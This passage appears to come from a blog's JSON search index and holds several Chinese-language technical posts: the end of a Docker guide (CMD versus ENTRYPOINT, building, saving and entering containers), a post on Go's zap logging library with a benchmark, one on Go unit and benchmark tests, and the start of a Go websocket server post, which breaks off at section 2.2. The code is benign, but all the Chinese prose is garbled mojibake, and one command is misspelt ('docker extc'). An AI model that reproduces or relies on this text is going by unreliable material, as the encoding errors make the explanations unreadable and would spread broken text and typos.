å¦‚æœå‘½ä»¤åé¢æœ‰ä¸œè¥¿ï¼Œé‚£ä¹ˆåé¢çš„å…¨éƒ¨éƒ½ä¼šä½œä¸ºentrypointçš„å‚æ•°ã€‚å¦‚æœæ²¡æœ‰ï¼Œä½†æ˜¯cmdæœ‰ï¼Œé‚£ä¹ˆcmdçš„å…¨éƒ¨å†…å®¹ä¼šä½œä¸ºentrypointçš„å‚æ•°, ä¼šè¾“å‡º hello cmd çš„\n  \n  CMD [\"hello cmd!\"]\n  ENTRYPOINT [\"echo\"]\n  \n  \n  \n  \n  eg2: è¿™ä¸ªæ—¶å€™æ˜¯ä¸ä¼šè¾“å‡º hello cmd çš„\n  \n  CMD [\"hello cmd!\"]\n  ENTRYPOINT echo\n  ```\n\n+ è¦†ç›–é—®é¢˜\n\n  + cmd é™¤éé»˜è®¤, å¦åˆ™è½»æ˜“è¢«è¦†ç›–\n\n  + entrypoint å¯ä»¥ç”¨ --entrypoint è¦†ç›–\n\n  + æ‰€ä»¥å»ºè®®entrypointå›ºå®š, cmd è¢«è¦†ç›–, ç»“åˆä½¿ç”¨, å¹¶ä¸”æ°¸è¿œä½¿ç”¨Execè¡¨ç¤ºæ³•\n\n\n\n##### 2.9 ç¯å¢ƒå˜é‡å†™æ³•\n\n```\nENV KS_HAVEN_ADDR=':16097' \\\nKS_HAVEN_QUIC_ADDR=':16097'\n```\n\n\n\n### 3. æ„å»ºé•œåƒ\n\nåœ¨ Dockerfile æ–‡ä»¶æ‰€åœ¨ç›®å½•æ‰§è¡Œï¼š    `docker build -t image_name .`\n\n\n\n##### 3.1 æ„å»ºçš„ä¸Šä¸‹æ–‡\n\n1. c/sæ¶æ„, åœ¨æœåŠ¡ç«¯æ„å»º\n2. æœåŠ¡ç«¯è¦è·å–æ–‡ä»¶, éœ€è¦æŠŠä¸Šä¸‹æ–‡ç›®å½•æ‰“åŒ…å‘è¿‡å» (COPY ../package.json /app æˆ–è€… COPY /opt/xxxx /app æ— æ³•æˆåŠŸ, è¶…å‡ºäº†ä¸Šä¸‹æ–‡)\n3. æœ€å¥½å°†dockerfileæ”¾åœ¨ç©ºç›®å½•ä¸‹æˆ–é¡¹ç›®æ ¹ç›®å½•ä¸‹, å¦‚æœæ²¡æœ‰æ‰€éœ€æ–‡ä»¶,æ‹·è´è¿‡æ¥, é¿å…å‘é€å¤ªå¤šæ–‡ä»¶ç»™å¼•æ“\n\n\n\n##### 3.2 é•œåƒ save load\n\n```bash\ndocker images #æŸ¥çœ‹æ„å»ºçš„image\n\ndocker save image/test > image_test.tar.gz # save image\n\ndocker load -i image_test.tar.gz # load image\n```\n\n\n\n### 4. å®¹å™¨æ“ä½œ\n\n\n\n##### 4.1 è¿è¡Œå’Œè¿›å…¥å®¹å™¨\n\n```bash\ndocker run -d -p 16097:16097 -p 15098:15098  image_name # å¯åŠ¨å®¹å™¨\n\ndocker extc -it å®¹å™¨åå­— bash # è¿›å…¥å®¹å™¨å†…éƒ¨\ndocker exec -it å®¹å™¨ID  sh   # è¿›å…¥å®¹å™¨å†…éƒ¨\n```\n\n\n\n##### 4.2 çœ‹å®¹å™¨log\n\n```bash\ndocker logs -f CONTAINER_ID\n\ndocker logs -f --tail=100 CONTAINER_ID\n```\n\n\n\n##### 4.3 å®¹å™¨å’Œå®¿ä¸»æ‹·è´å†…å®¹\n\n```bash\ndocker cp foo.txt mycontainer:/foo.txt \ndocker cp mycontainer:/foo.txt foo.txt\n```\n\n\n\n##### 4.4 å®¹å™¨è®¿é—®å®¿ä¸»ä¸»æœºç«¯å£\n\n+ https://jingsam.github.io/2018/10/16/host-in-docker.html\n\n\n\n### 5. å‚è€ƒèµ„æ–™\n\n+ https://blog.csdn.net/wdq347/article/details/78753322 dockerä¹‹é•œåƒåˆ¶ä½œ\n+ https://deepzz.com/post/dockerfile-best-practices.html  å¦‚ä½•å†™å¥½Dockerfileï¼ŒDockerfileæœ€ä½³å®è·µ","tags":["docker"],"categories":["docker"]},{"title":"golangçš„logåº“zapçš„ä½¿ç”¨","url":"%2Fp%2F5d303099.html","content":"\n### 0. å‰è¨€\n\næ—¥å¿—ä½œä¸ºæ•´ä¸ªä»£ç è¡Œä¸ºçš„è®°å½•ï¼Œæ˜¯ç¨‹åºæ‰§è¡Œé€»è¾‘å’Œå¼‚å¸¸æœ€ç›´æ¥çš„åé¦ˆã€‚å¯¹äºæ•´ä¸ªç³»ç»Ÿæ¥è¯´ï¼Œæ—¥å¿—æ˜¯è‡³å…³é‡è¦çš„ç»„æˆéƒ¨åˆ†ã€‚é€šè¿‡åˆ†ææ—¥å¿—æˆ‘ä»¬ä¸ä»…å¯ä»¥å‘ç°ç³»ç»Ÿçš„é—®é¢˜ï¼ŒåŒæ—¶æ—¥å¿—ä¸­ä¹Ÿè•´å«äº†å¤§é‡æœ‰ä»·å€¼å¯ä»¥è¢«æŒ–æ˜çš„ä¿¡æ¯ï¼Œå› æ­¤åˆç†åœ°è®°å½•æ—¥å¿—æ˜¯ååˆ†å¿…è¦çš„ã€‚\n\n<!-- more -->\n\n### 1. golang log libs\n\nç›®å‰golangä¸»æµçš„ logåº“æœ‰\n\n+ https://github.com/uber-go/zap\n+ https://github.com/Sirupsen/logrus\n\nzap è·Ÿ logrus ä»¥åŠç›®å‰ä¸»æµçš„ go è¯­è¨€ log ç±»ä¼¼ï¼Œæå€¡é‡‡ç”¨ç»“æ„åŒ–çš„æ—¥å¿—æ ¼å¼ï¼Œè€Œä¸æ˜¯å°†æ‰€æœ‰æ¶ˆæ¯æ”¾åˆ°æ¶ˆæ¯ä½“ä¸­ï¼Œç®€å•æ¥è®²ï¼Œæ—¥å¿—æœ‰ä¸¤ä¸ªæ¦‚å¿µï¼šå­—æ®µå’Œæ¶ˆæ¯ã€‚å­—æ®µç”¨æ¥ç»“æ„åŒ–è¾“å‡ºé”™è¯¯ç›¸å…³çš„ä¸Šä¸‹æ–‡ç¯å¢ƒï¼Œè€Œæ¶ˆæ¯ç®€æ˜æ‰¼è¦çš„é˜è¿°é”™è¯¯æœ¬èº«ã€‚\n\n##### 1.1 logåº“ä½¿ç”¨å’Œæ€§èƒ½å¯¹æ¯”\n\n```go\npackage main\n\nimport (\n\t\"encoding/json\"\n\t\"fmt\"\n\t\"log\"\n\t\"math/rand\"\n\t\"time\"\n\n\t\"github.com/golang/glog\"\n\t\"github.com/sirupsen/logrus\"\n\t\"go.uber.org/zap\"\n)\n\ntype dummy struct {\n\tFoo string `json:\"foo\"`\n\tBar string `json:\"bar\"`\n}\n\nconst letterBytes = \"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ\"\nconst (\n\tletterIdxBits = 6                    // 6 bits to represent a letter index\n\tletterIdxMask = 1<<letterIdxBits - 1 // All 1-bits, as many as letterIdxBits\n\tletterIdxMax  = 63 / letterIdxBits   // # of letter indices fitting in 63 bits\n)\n\nfunc RandString(n int) string {\n\tb := make([]byte, n)\n\t// A rand.Int63() generates 63 random bits, enough for letterIdxMax letters!\n\tfor i, cache, remain := n-1, rand.Int63(), letterIdxMax; i >= 0; {\n\t\tif remain == 0 {\n\t\t\tcache, remain = rand.Int63(), letterIdxMax\n\t\t}\n\t\tif idx := int(cache & letterIdxMask); idx < len(letterBytes) {\n\t\t\tb[i] = letterBytes[idx]\n\t\t\ti--\n\t\t}\n\t\tcache >>= letterIdxBits\n\t\tremain--\n\t}\n\treturn string(b)\n}\n\nfunc dummyData() interface{} {\n\treturn dummy{\n\t\tFoo: RandString(12),\n\t\tBar: RandString(16),\n\t}\n}\n\nfunc main() {\n\n\t// logrus\n\tvar x int64 = 0\n\tt := time.Now()\n\tfor i := 0; i < 10000; i++ {\n\t\tlogrus.WithField(\"Dummy\", dummyData()).Infoln(\"this is a dummy log\")\n\t}\n\tx += time.Since(t).Nanoseconds()\n\n\t// zap\n\tzlogger, _ := zap.NewProduction()\n\tsugar := zlogger.Sugar()\n\tvar y int64 = 0\n\tt = time.Now()\n\tfor i := 0; i < 10000; i++ {\n\t\tsugar.Infow(\"this is a dummy log\", \"Dummy\", dummyData())\n\t}\n\ty += time.Since(t).Nanoseconds()\n\n\t// stdlog\n\tvar z int64 = 0\n\tt = time.Now()\n\tfor i := 0; i < 10000; i++ {\n\t\tdummyStr, _ := json.Marshal(dummyData())\n\t\tlog.Printf(\"this is a dummy log: %s\\n\", string(dummyStr))\n\t}\n\tz += time.Since(t).Nanoseconds()\n\n\t// glog\n\tvar w int64 = 0\n\tt = time.Now()\n\tfor i := 0; i < 10000; i++ {\n\t\tglog.Info(\"\\nthis is a dummy log: \", dummyData())\n\t}\n\tw += time.Since(t).Nanoseconds()\n\n\t// print\n\tfmt.Println(\"=====================\")\n\tfmt.Printf(\"Logrus: %5d ns per request \\n\", x/10000)\n\tfmt.Printf(\"Zap:    %5d ns per request \\n\", y/10000)\n\tfmt.Printf(\"StdLog: %5d ns per request \\n\", z/10000)\n\tfmt.Printf(\"Glog:   %5d ns per request \\n\", w/10000)\n}\n\n\n/*\n=====================\nLogrus: 19305 ns per request\nZap:     1095 ns per request\nStdLog:  7137 ns per request\nGlog:   12070 ns per request\n*/\n```\n\n\n\n### 2. zap ä½¿ç”¨\n\n+ sugaræ¨¡å¼ (ç‰ºç‰²æ€§èƒ½ä¸ºä»£ä»·,å¢å¼ºå¯ç”¨æ€§)\n\n```go\nfunc main() {\n\tlogger, _ := zap.NewProduction()\n\tdefer logger.Sync()\n\n\turl := \"https://www.liuvv.com\"\n\tsugar := logger.Sugar()\n\tsugar.Infow(\"failed to fetch URL\",\n\t\t\"url\", url,\n\t\t\"attempt\", 3,\n\t\t\"backoff\", time.Second,\n\t)\n\n\tsugar.Infof(\"Failed to fetch URL: %s\", url)\n}\n\n\n// æ³¨æ„ infow å’Œ infof çš„è°ƒç”¨åŒºåˆ«\n\n/*\n{\"level\":\"info\",\"ts\":1566623998.1506088,\"caller\":\"log/main.go:15\",\"msg\":\"failed to fetch URL\",\"url\":\"https://www.liuvv.com\",\"attempt\":3,\"backoff\":1}\n \n{\"level\":\"info\",\"ts\":1566623998.15073,\"caller\":\"log/main.go:20\",\"msg\":\"Failed to fetch URL: https://www.liuvv.com\"}\n*/\n```\n\n+ logger æ¨¡å¼\n\n```go\nfunc main() {\n\tlogger, _ := zap.NewProduction()\n\tdefer logger.Sync()\n\n\turl := \"https://www.liuvv.com\"\n\tlogger.Info(\"failed to fetch URL\",\n\t\tzap.String(\"url\", url),\n\t\tzap.Int(\"attempt\", 3),\n\t\tzap.Duration(\"backoff\", time.Second),\n\t)\n\n\t//logger.Infow() //æ²¡æœ‰æ­¤å‡½æ•°\n\t//logger.Infof() //æ²¡æœ‰æ­¤å‡½æ•°\n}\n\n\n/*\n{\"level\":\"info\",\"ts\":1566624270.4984472,\"caller\":\"log/main.go:14\",\"msg\":\"failed to fetch URL\",\"url\":\"https://www.liuvv.com\",\"attempt\":3,\"backoff\":1}\n*/\n```\n\n\n\n##### 2.1 zapåºåˆ—åŒ–è¾“å‡º\n\n```\nzap.NewDevelopment() //æ ¼å¼åŒ–è¾“å‡º\nzap.NewProduction() //jsonåºåˆ—åŒ–è¾“å‡º\n```\n\n\n\n##### 2.2 è¾“å‡ºåˆ°æ–‡ä»¶é‡Œ\n\n```go\nfunc NewLogger() (*zap.Logger, error) {\n  cfg := zap.NewProductionConfig()\n  cfg.OutputPaths = []string{\n    \"/var/log/myproject/myproject.log\",\n  }\n  return cfg.Build()\n}\n```\n\n\n\n##### 2.3 è¾“å…¥åˆ°æ»šåŠ¨æ–‡ä»¶é‡Œ\n\nLumberjackç”¨äºå°†æ—¥å¿—å†™å…¥æ»šåŠ¨æ–‡ä»¶ã€‚zap ä¸æ”¯æŒæ–‡ä»¶å½’æ¡£ï¼Œå¦‚æœè¦æ”¯æŒæ–‡ä»¶æŒ‰å¤§å°æˆ–è€…æ—¶é—´å½’æ¡£ï¼Œéœ€è¦ä½¿ç”¨lumberjackï¼Œlumberjackä¹Ÿæ˜¯zapå®˜æ–¹æ¨èçš„ã€‚https://github.com/natefinch/lumberjack\n\n```go\nfunc main() {\n\t// lumberjack.Logger is already safe for concurrent use, so we don't need to\n\t// lock it.\n\thook := &lumberjack.Logger{\n\t\tFilename:   \"/tmp/foo.log\", // æ—¥å¿—æ–‡ä»¶è·¯å¾„\n\t\tMaxSize:    500,            // æ¯ä¸ªæ—¥å¿—æ–‡ä»¶ä¿å­˜çš„æœ€å¤§å°ºå¯¸ å•ä½ï¼šM\n\t\tMaxBackups: 3,              // æ—¥å¿—æ–‡ä»¶æœ€å¤šä¿å­˜å¤šå°‘ä¸ªå¤‡ä»½\n\t\tMaxAge:     28,             // æ–‡ä»¶æœ€å¤šä¿å­˜å¤šå°‘å¤©\n\t\tCompress:   true,           // æ˜¯å¦å‹ç¼©\n\t}\n\tcore := zapcore.NewCore(\n\t\tzapcore.NewJSONEncoder(zap.NewProductionEncoderConfig()),                       // ç¼–ç å™¨é…ç½®\n\t\tzapcore.NewMultiWriteSyncer(zapcore.AddSync(os.Stdout), zapcore.AddSync(hook)), // æ‰“å°åˆ°æ§åˆ¶å°å’Œæ–‡ä»¶\n\t\tzap.InfoLevel, // æ—¥å¿—çº§åˆ«\n\t)\n\n\tlogger := zap.New(core)\n\tlogger.Info(\"failed to fetch URL\",\n\t\tzap.String(\"url\", \"https://www.liuvv.com\"),\n\t\tzap.Int(\"attempt\", 3),\n\t\tzap.Duration(\"backoff\", time.Second),\n\t)\n}\n```\n\n\n\n### 3. å‚è€ƒèµ„æ–™\n\n+ https://zhuanlan.zhihu.com/p/41991119","tags":["golang"],"categories":["4_golangå®æˆ˜"]},{"title":"golangç¼–å†™æµ‹è¯•ç”¨ä¾‹","url":"%2Fp%2F269bf134.html","content":"\n\n\n### 1. Learn Go with tests\n\nå½“å­¦ä¹ ä¸€é—¨è¯­è¨€æ—¶, æœ€æœ‰æ•ˆçš„åŠæ³•ä¸æ˜¯æ¯ä¸€ç« çš„å»é˜…è¯»æ¦‚å¿µ, è€Œæ˜¯é€šè¿‡ä¾‹å­æ¢ç´¢å­¦ä¹ .\n\nå¦‚æœæ²¡æœ‰å­¦ä¹ è¿‡ Go è¯­è¨€çš„, å¼ºçƒˆå»ºè®®é€šè¿‡ç¼–å†™æµ‹è¯•å­¦ä¹  Go è¯­è¨€, ä¸ä»…ä¸ºæµ‹è¯•é©±åŠ¨å¼€å‘æ‰“ä¸‹åŸºç¡€, è¿˜æ˜¯å¯ä»¥ä½¿ç”¨ Go è¯­è¨€ç¼–å†™å¥å£®çš„ã€ç»è¿‡è‰¯å¥½æµ‹è¯•çš„ç³»ç»Ÿ.\n\nå¼ºçƒˆæ¨è: https://github.com/quii/learn-go-with-tests\n\n<!-- more -->\n\n\n\n### 2. Golang Test\n\nGoè¯­è¨€ä¸­è‡ªå¸¦æœ‰ä¸€ä¸ªè½»é‡çº§çš„æµ‹è¯•æ¡†æ¶`testing`å’Œè‡ªå¸¦çš„`go test`å‘½ä»¤æ¥å®ç°å•å…ƒæµ‹è¯•å’Œæ€§èƒ½æµ‹è¯•ï¼Œ`testing`æ¡†æ¶å’Œå…¶ä»–è¯­è¨€ä¸­çš„æµ‹è¯•æ¡†æ¶ç±»ä¼¼ï¼Œä½ å¯ä»¥åŸºäºè¿™ä¸ªæ¡†æ¶å†™é’ˆå¯¹ç›¸åº”å‡½æ•°çš„æµ‹è¯•ç”¨ä¾‹ï¼Œä¹Ÿå¯ä»¥åŸºäºè¯¥æ¡†æ¶å†™ç›¸åº”çš„å‹åŠ›æµ‹è¯•ç”¨ä¾‹ã€‚æµ‹è¯•ç”¨ä¾‹æœ‰å››ç§å½¢å¼ï¼š \n\n+ TestXxxx(t *testing.T) // å•å…ƒæµ‹è¯•\n+ TestBenchmarkXxxx(b* testing.B) // å‹åŠ›æµ‹è¯•\n+ Example_Xxx() // æµ‹è¯•æ§åˆ¶å°è¾“å‡ºçš„ä¾‹å­ \n+ TestMain(m *testing.M) // æµ‹è¯•Mainå‡½æ•°\n\nå½“ç„¶æˆ‘ä»¬ä¹Ÿå¯ä»¥ä½¿ç”¨ç¬¬ä¸‰æ–¹çš„æµ‹è¯•æ¡†æ¶, æ›´åŠ é«˜æ•ˆçš„æµ‹è¯•æˆ‘ä»¬çš„ä»£ç :\n\nhttps://github.com/stretchr/testify\n\n\n\n###  3. å•å…ƒæµ‹è¯•\n\n\n+ éœ€è¦åˆ›å»ºä¸€ä¸ªåç§°ä»¥ _test.go ç»“å°¾çš„æ–‡ä»¶ï¼Œè¯¥æ–‡ä»¶åŒ…å« `TestXxx` å‡½æ•°\n+ `func TestXxx(*testing.T)`   // Xxx å¯ä»¥æ˜¯ä»»ä½•å­—æ¯æ•°å­—å­—ç¬¦ä¸²ï¼Œä½†æ˜¯ç¬¬ä¸€ä¸ªå­—æ¯ä¸èƒ½æ˜¯å°äº›å­—æ¯ã€‚\n+ å•å…ƒæµ‹è¯•ä¸­ï¼Œä¼ é€’ç»™æµ‹è¯•å‡½æ•°çš„å‚æ•°æ˜¯ `*testing.T` ç±»å‹ã€‚\n\n\n\n##### 3.1 å•å…ƒæµ‹è¯•æ–¹æ³•\n\n+ å½“æˆ‘ä»¬é‡åˆ°ä¸€ä¸ªæ–­è¨€é”™è¯¯çš„æ—¶å€™ï¼Œæ ‡è¯†è¿™ä¸ªæµ‹è¯•å¤±è´¥ï¼Œä¼šä½¿ç”¨åˆ°ï¼š\n\n  ```\n  Fail: æµ‹è¯•å¤±è´¥ï¼Œæµ‹è¯•ç»§ç»­ï¼Œä¹Ÿå°±æ˜¯ä¹‹åçš„ä»£ç ä¾ç„¶ä¼šæ‰§è¡Œ\n  FailNow: æµ‹è¯•å¤±è´¥ï¼Œæµ‹è¯•ä¸­æ–­\n  ```\n\n+ å½“æˆ‘ä»¬åªå¸Œæœ›æ‰“å°ä¿¡æ¯ï¼Œä¼šç”¨åˆ°:\n\n  ```\n  Log: è¾“å‡ºä¿¡æ¯\n  Logf: è¾“å‡ºæ ¼å¼åŒ–çš„ä¿¡æ¯\n  ```\n\n+ å½“æˆ‘ä»¬æ–­è¨€å¤±è´¥çš„æ—¶å€™ï¼Œä¸å¸Œæœ›æ ‡è¯†æµ‹è¯•å¤±è´¥ï¼Œä¼šç”¨åˆ°ï¼š\n\n  ```\n  Skip: ç›¸å½“äº Log + SkipNow\n  Skipf: ç›¸å½“äº Logf + SkipNow\n  SkipNow: è·³è¿‡æµ‹è¯•ï¼Œæµ‹è¯•ä¸­æ–­\n  ```\n\n+ å½“æˆ‘ä»¬æ–­è¨€å¤±è´¥çš„æ—¶å€™ï¼Œå¸Œæœ›æ ‡è¯†æµ‹è¯•å¤±è´¥ï¼Œä½†æ˜¯æµ‹è¯•ç»§ç»­ï¼Œä¼šç”¨åˆ°ï¼š\n\n  ```\n  Error: ç›¸å½“äº Log + Fail\n  Errorf: ç›¸å½“äº Logf + Fail\n  ```\n\n+ å½“æˆ‘ä»¬æ–­è¨€å¤±è´¥çš„æ—¶å€™ï¼Œå¸Œæœ›æ ‡è¯†æµ‹è¯•å¤±è´¥ï¼Œä½†ä¸­æ–­æµ‹è¯•ï¼Œä¼šç”¨åˆ°\n\n  ```\n  Fatal: ç›¸å½“äº Log + FailNow\n  Fatalf: ç›¸å½“äº Logf + FailNow\n  ```\n\n  \n\n### 4.  å‹åŠ›æµ‹è¯•\n\n+ func BenchmarkXxx(*testing.B)  //å‡½æ•°å½¢å¼\n+ é€šè¿‡ \"go test\" å‘½ä»¤ï¼ŒåŠ ä¸Š `-bench` flag æ¥æ‰§è¡Œ\n\n```go\nfunc BenchmarkIsPalindrome(b *testing.B) {\n\tfor i := 0; i < b.N; i++ {\n\t\tIsPalindrome(\"A man, a plan, a canal: Panama\")\n\t}\n}\n\n$ go test -bench=.\nPASS\nBenchmarkIsPalindrome-8 1000000                1035 ns/op\nok      gopl.io/ch11/word2      2.179s\n```\n\nç»“æœä¸­åŸºå‡†æµ‹è¯•åçš„æ•°å­—åç¼€éƒ¨åˆ†ï¼Œè¿™é‡Œæ˜¯8ï¼Œè¡¨ç¤ºè¿è¡Œæ—¶å¯¹åº”çš„GOMAXPROCSçš„å€¼ã€‚\n\næŠ¥å‘Šæ˜¾ç¤ºæ¯æ¬¡è°ƒç”¨IsPalindromeå‡½æ•°èŠ±è´¹1.035å¾®ç§’ï¼Œæ˜¯æ‰§è¡Œ1,000,000æ¬¡çš„å¹³å‡æ—¶é—´ã€‚\n\nå› ä¸ºåŸºå‡†æµ‹è¯•é©±åŠ¨å™¨å¼€å§‹æ—¶å¹¶ä¸çŸ¥é“æ¯ä¸ªåŸºå‡†æµ‹è¯•å‡½æ•°è¿è¡Œæ‰€èŠ±çš„æ—¶é—´ï¼Œå®ƒä¼šå°è¯•åœ¨çœŸæ­£è¿è¡ŒåŸºå‡†æµ‹è¯•å‰å…ˆå°è¯•ç”¨è¾ƒå°çš„Nè¿è¡Œæµ‹è¯•æ¥ä¼°ç®—åŸºå‡†æµ‹è¯•å‡½æ•°æ‰€éœ€è¦çš„æ—¶é—´ï¼Œç„¶åæ¨æ–­ä¸€ä¸ªè¾ƒå¤§çš„æ—¶é—´ä¿è¯ç¨³å®šçš„æµ‹é‡ç»“æœã€‚\n\n\n\n### 5. å¸¸ç”¨æµ‹è¯•ç”¨æ³•\n\n##### 5.1 æµ‹è¯•å•ä¸ªæ–‡ä»¶å’Œå•ä¸ªæ–¹æ³•\n\n+ æµ‹è¯•å•ä¸ªæ–‡ä»¶ go test -v  file_test.go\n\n+ æµ‹è¯•å•ä¸ªå‡½æ•°ï¼šgo test -v file_test.go -test.run TestFunc\n\n##### 5.2 æµ‹è¯•goroutine æ˜¯å¦ç«äº‰\n\n```\ngo test -race\n```\n\n##### 5. 3 TestMainå‡½æ•°\n\nåœ¨æµ‹è¯•ä¹‹å‰æˆ–ä¹‹åè¿›è¡Œé¢å¤–çš„è®¾ç½®ï¼ˆsetupï¼‰æˆ–æ‹†å¸ï¼ˆteardown), æµ‹è¯•è¿›å…¥çš„ç¬¬ä¸€ä¸ªå‡½æ•°\n\n```\nfunc TestMain(m *testing.M)\n```\n\n##### 5.4 æµ‹è¯•è¦†ç›–ç‡\n\n```\ngo tool cover -html=c.out\n```\n\n\n\n### 6. å‚è€ƒèµ„æ–™\n\n+ https://github.com/quii/learn-go-with-tests  //éå¸¸é‡è¦\n+ https://github.com/stretchr/testify\n\n+ https://books.studygolang.com/The-Golang-Standard-Library-by-Example/chapter09/09.0.html\n\n+ https://studygolang.com/articles/12587\n\n","tags":["golang"],"categories":["4_golangå®æˆ˜"]},{"title":"golangçš„websocketå®æˆ˜","url":"%2Fp%2Ffae4c74c.html","content":"\n### 1. å‰è¨€\n\næœ‰äº›åœºæ™¯ä¸‹ï¼Œæ¯”å¦‚äº¤æ˜“ K çº¿ï¼Œæˆ‘ä»¬éœ€è¦å‰ç«¯å¯¹åç«¯è¿›è¡Œè½®è¯¢æ¥ä¸æ–­è·å–æˆ–è€…æ›´æ–°èµ„æºçŠ¶æ€ã€‚è½®è¯¢çš„é—®é¢˜æ¯«æ— ä»¥ä¸ºæ˜¯ä¸€ç§ç¬¨é‡çš„æ–¹å¼ï¼Œå› ä¸ºæ¯ä¸€æ¬¡ http è¯·æ±‚é™¤äº†æœ¬èº«çš„èµ„æºä¿¡æ¯ä¼ è¾“å¤–è¿˜æœ‰ä¸‰æ¬¡æ¡æ‰‹ä»¥åŠå››æ¬¡æŒ¥æ‰‹ã€‚æ›¿ä»£è½®è¯¢çš„ä¸€ç§æ–¹æ¡ˆæ˜¯å¤ç”¨ä¸€ä¸ª http è¿æ¥ï¼Œæ›´å‡†ç¡®çš„å¤ç”¨åŒä¸€ä¸ª tcp è¿æ¥ã€‚è¿™ç§æ–¹å¼å¯ä»¥æ˜¯ http é•¿è¿æ¥ï¼Œä¹Ÿå¯ä»¥æ˜¯ websocketã€‚\n\n<!-- more -->\n\n##### 1.1. httpé•¿è¿æ¥\n\nhttp å…¶å®ä¸å­˜åœ¨é•¿çŸ­è¿æ¥, httpåè®®çš„é•¿è¿æ¥å’ŒçŸ­è¿æ¥ï¼Œå®è´¨ä¸Šæ˜¯tcpåè®®çš„é•¿è¿æ¥å’ŒçŸ­è¿æ¥ã€‚\n\nhttpä¼šè¯æ°¸è¿œéƒ½æ˜¯ï¼šè¯·æ±‚å“åº”ç»“æŸï¼Œè¿™é‡Œé•¿è¿æ¥æŒ‡ä¸€æ¬¡tcpè¿æ¥å¯ä»¥ä¼ é€’å¤šæ¬¡çš„HTTPæŠ¥æ–‡ä¿¡æ¯ã€‚\n\n##### 1.2 websocket\n\nwebsocketåè®®æ˜¯åŸºäºtcpçš„ä¸€ç§æ–°çš„ç½‘ç»œåè®®ã€‚å®ƒå®ç°äº†æµè§ˆå™¨ä¸æœåŠ¡å™¨å…¨åŒå·¥(full-duplex)é€šä¿¡â€”â€”å…è®¸æœåŠ¡å™¨ä¸»åŠ¨å‘é€ä¿¡æ¯ç»™å®¢æˆ·ç«¯ã€‚\nwebsocketé€šä¿¡åè®®äº2011å¹´è¢«IETFå®šä¸ºæ ‡å‡†RFC 6455ï¼Œå¹¶è¢«RFC7936æ‰€è¡¥å……è§„èŒƒã€‚\n\n##### 1.3 websocket å’Œ http é•¿è¿æ¥çš„åŒºåˆ«\n\né¦–å…ˆ websocket å’Œ http æ˜¯å®Œå…¨ä¸åŒçš„ä¸¤ç§åè®®ï¼Œè™½ç„¶åº•å±‚éƒ½æ˜¯ tcp/ipã€‚http é•¿è¿æ¥ä¹Ÿæ˜¯å±äº http åè®®ã€‚\n\nhttp åè®®å’Œ websocket çš„æœ€å¤§åŒºåˆ«å°±æ˜¯ http æ˜¯åŸºäº request/response æ¨¡å¼ï¼Œè€Œ websocket çš„ client å’Œ server ç«¯å´å¯ä»¥éšæ„å‘èµ· data pushã€‚\n\n##### 1.4 sse(server-sent events)\n\nsseæ˜¯ websockct çš„ä¸€ç§è½»é‡ä»£æ›¿æ–¹æ¡ˆï¼Œä½¿ç”¨ http åè®®ã€‚sse è§„èŒƒæ˜¯ html5 è§„èŒƒçš„ä¸€ä¸ªç»„æˆéƒ¨åˆ†ã€‚\n\nä¸¥æ ¼åœ°è¯´ï¼Œhttpæ— æ³•åšåˆ°æœåŠ¡å™¨ä¸»åŠ¨æ¨é€ä¿¡æ¯ã€‚ä½†æ˜¯ï¼Œæœ‰ä¸€ç§å˜é€šæ–¹æ³•ï¼Œå°±æ˜¯æœåŠ¡å™¨å‘å®¢æˆ·ç«¯å£°æ˜ï¼Œæ¥ä¸‹æ¥è¦å‘é€çš„æ˜¯æµä¿¡æ¯ï¼ˆContent-Type: text/event-streamï¼‰ã€‚\n\næ€»ä½“æ¥è¯´ï¼Œwebsocket æ›´å¼ºå¤§å’Œçµæ´»ã€‚å› ä¸ºå®ƒæ˜¯å…¨åŒå·¥é€šé“ï¼Œå¯ä»¥åŒå‘é€šä¿¡ï¼›sse æ˜¯å•å‘é€šé“ï¼Œåªèƒ½æœåŠ¡å™¨å‘æµè§ˆå™¨å‘é€ï¼Œå› ä¸ºæµä¿¡æ¯æœ¬è´¨ä¸Šå°±æ˜¯ä¸‹è½½ã€‚å¦‚æœæµè§ˆå™¨å‘æœåŠ¡å™¨å‘é€ä¿¡æ¯ï¼Œå°±å˜æˆäº†å¦ä¸€æ¬¡ http è¯·æ±‚ã€‚\n\n\n\n### 2. golang websocket\n\nåœ¨golangè¯­è¨€ä¸­ï¼Œç›®å‰æœ‰ä¸¤ç§æ¯”è¾ƒå¸¸ç”¨çš„å®ç°æ–¹å¼ï¼šä¸€ä¸ªæ˜¯golangè‡ªå¸¦çš„åº“ï¼Œå¦ä¸€ä¸ªæ˜¯[gorilla](github.com/gorilla/websocket)ï¼Œåè€…åŠŸèƒ½æ›´åŠ å¼ºå¤§ã€‚\n\n\n\n##### 2.1 serverç«¯\n\nä¸‹é¢serverç«¯æ˜¯ä¸€ä¸ªhttp æœåŠ¡å™¨ï¼Œç›‘å¬8080ç«¯å£ã€‚å½“æ¥æ”¶åˆ°è¿æ¥è¯·æ±‚åï¼Œå°†è¿æ¥ä½¿ç”¨çš„httpåè®®å‡çº§ä¸ºwebsocketåè®®ã€‚åç»­é€šä¿¡è¿‡ç¨‹ä¸­ï¼Œä½¿ç”¨websocketè¿›è¡Œé€šä¿¡ã€‚\n\nå¯¹æ¯ä¸ªè¿æ¥ï¼Œserverç«¯ç­‰å¾…è¯»å–æ•°æ®ï¼Œè¯»åˆ°æ•°æ®åï¼Œæ‰“å°æ•°æ®ï¼Œç„¶åï¼Œå°†æ•°æ®åˆå‘é€ç»™client\n\n```go\npackage main\n\nimport (\n\t\"flag\"\n\t\"log\"\n\t\"net/http\"\n\n\t\"github.com/gorilla/websocket\"\n)\n\nvar addr = flag.String(\"addr\", \"localhost:8080\", \"http service address\")\n\nvar upgrader = websocket.Upgrader{} // use default options\n\nfunc echo(w http.ResponseWriter, r *http.Request) {\n\tc, err := upgrader.Upgrade(w, r, nil)\n\tif err != nil {\n\t\tlog.Print(\"upgrade:\", err)\n\t\treturn\n\t}\n\tdefer c.Close()\n\tfor {\n\t\tmt, message, err := c.ReadMessage()\n\t\tif err != nil {\n\t\t\tlog.Println(\"read:\", err)\n\t\t\tbreak\n\t\t}\n\t\tlog.Printf(\"server recv: %s\", message)\n\t\terr = c.WriteMessage(mt, message)\n\t\tif err != nil {\n\t\t\tlog.Println(\"write:\", err)\n\t\t\tbreak\n\t\t}\n\t}\n}\n\nfunc main() {\n\tflag.Parse()\n\thttp.HandleFunc(\"/echo\", echo)\n\tlog.Fatal(http.ListenAndServe(*addr, nil))\n}\n```\n\n\n\n##### 2.2 